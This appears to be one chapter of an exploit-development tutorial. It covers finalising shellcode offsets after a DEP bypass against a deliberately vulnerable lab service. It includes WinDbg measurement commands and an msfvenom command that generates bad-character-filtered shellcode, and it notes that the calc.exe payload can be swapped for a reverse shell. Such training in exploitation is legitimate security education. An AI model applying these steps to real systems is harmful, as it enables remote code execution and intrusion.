## 11. Landing real shellcode

### 11.1 Finalise the shellcode offset

The `-0x210` / `-0x20C` deltas in P3/P4 were placeholders. Now that the chain
length is frozen, measure the true gap. After VP returns and EIP reaches your
`int3` block, in WinDbg:

```
0:000> dd eip L40          ; find where the 0xCC block starts and ends
0:000> ? <cc_start> - <esi_at_store>    ; the real delta from the store point
```

Update the deltas so `lpAddress`/return-address point exactly at the first
shellcode byte. Simpler alternative: leave the deltas approximate and insert
**padding** between the chain and the shellcode so the target lands on a NOP sled
you control. Either works; padding is more forgiving.

### 11.2 Measure available space

```
0:000> dd eip L80          ; how many bytes of RWX runway before it turns to garbage?
0:000> ? <end> - eip
```

The stack body is bounded by `VULNSVC_MAX_BODY` (0x2000) minus the offset and
chain. If it is too small for a staged payload, enlarge the request body — the
transport caps at 0x2000, giving ample room here. (If you needed more than the
cap, you'd switch to an egghunter; you don't here.)

### 11.3 Generate bad-char-safe shellcode

```
msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread \
    -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v sc
```

Always pass `-b`. Encoders (shikata) inflate size — budget space accordingly and
re-check it fits. Prepend a short NOP sled (`\x90` is not a bad char) if you used
the padding approach.

### 11.4 Fire without the debugger

Remove any temporary `int3`/breakpoint gadget, run `service.exe` standalone, and
launch the exploit. `calc.exe` pops as the service account. Swap to a reverse
shell by changing only the `msfvenom` payload (and starting a handler) — the
exploit body is unchanged, which is the proof that your DEP bypass is
payload-agnostic.

---

---

[← Previous](10-firing-and-discipline.md) · [Index](00-index.md) · [Next →](12-virtualalloc.md)
